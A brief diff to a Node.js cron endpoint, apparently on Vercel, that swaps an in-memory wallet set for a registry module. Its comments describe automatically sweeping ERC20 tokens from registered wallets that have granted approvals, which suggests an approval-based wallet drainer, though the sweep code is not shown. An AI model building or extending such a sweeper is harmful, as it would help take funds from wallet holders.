@@ -17,8 +17,7 @@ const ERC20_ABI = [
   'function decimals() view returns (uint8)'
 ];
 
-// In-memory store of registered wallets
-let registeredWallets = new Set();
+const { getRegisteredWallets } = require('../lib/wallet-registry');
 
 // This endpoint can be called by Vercel Cron or manually
 // It automatically sweeps tokens from all registered wallets that have approved
@@ -27,7 +26,7 @@ module.exports = async (req, res) => {
     console.log(`🔄 Auto-sweep cron started at ${new Date().toISOString()}`);
     
     // Get list of registered wallets
-    const wallets = Array.from(registeredWallets);
+    const wallets = getRegisteredWallets();
     
     if (wallets.length === 0) {
       console.log('⏭️ No registered wallets to monitor');
